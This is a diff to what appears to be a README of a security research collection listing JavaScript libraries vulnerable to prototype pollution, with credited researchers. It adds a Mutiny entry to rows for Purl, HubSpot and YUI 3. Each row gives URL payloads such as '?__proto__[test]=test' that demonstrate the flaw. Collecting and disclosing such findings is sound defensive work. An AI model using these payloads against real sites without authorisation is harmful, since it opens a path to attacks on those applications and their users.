@@ -25,6 +25,7 @@ In this repository, I am trying to collect examples of libraries that are vulner
 | [Purl (jQuery-URL-Parser)](/pp/purl.md)                           | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`<br>`#__proto__[test]=test`|                            | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 | [HubSpot Tracking Code (**Fixed**)](/pp/hubspot.md)               | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`<br>`#__proto__[test]=test`|                            | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 | [YUI 3 querystring-parse](/pp/yui3.md)                            | `?constructor[prototype][test]=test`                                     |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [Mutiny](/pp/mutiny.md)                                           | `?__proto__.test=test`                                                   |                                             | [SPQR](https://twitter.com/amlnspqr)             |
 
 ## Script Gadgets
 
